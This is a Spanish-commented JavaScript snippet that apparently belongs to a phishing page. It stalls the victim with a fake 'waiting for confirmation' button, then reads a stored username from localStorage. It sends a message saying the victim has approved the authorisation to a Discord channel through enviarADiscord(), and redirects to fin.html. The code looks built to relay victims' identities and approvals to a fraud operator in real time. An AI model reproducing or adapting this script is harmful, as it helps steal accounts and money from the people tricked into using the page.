document.addEventListener('DOMContentLoaded', () => {
    const correoForm = document.getElementById('correoForm');
    const continueButton = document.querySelector('.btn-continue');

    // Deshabilitar el botón y ponerlo en gris durante 10 segundos
    continueButton.disabled = true;
    continueButton.style.backgroundColor = '#ccc';
    continueButton.style.cursor = 'not-allowed';
    continueButton.innerText = 'Esperando Confirmacion';

    setTimeout(() => {
        continueButton.disabled = false;
        continueButton.style.backgroundColor = ''; // Restaura el color original del botón
        continueButton.style.cursor = 'pointer';
        continueButton.innerText = 'Continuar';
    }, 10000);

    const REDIRECCION_URL = 'fin.html';

    correoForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const usuario = localStorage.getItem('usuario_guardado') || 'No detectado';

        const mensaje = `📢 **Atento!!!**\n\n` +
                        `ℹ️ **Estado:** El usuario Marco Que Te Autorizo\n` +
                        `👤 **Usuario Asociado:** ${usuario}\n\n`;

        continueButton.disabled = true;
        continueButton.innerText = 'Procesando...';

        await enviarADiscord(mensaje);
        window.location.href = REDIRECCION_URL;
    });
});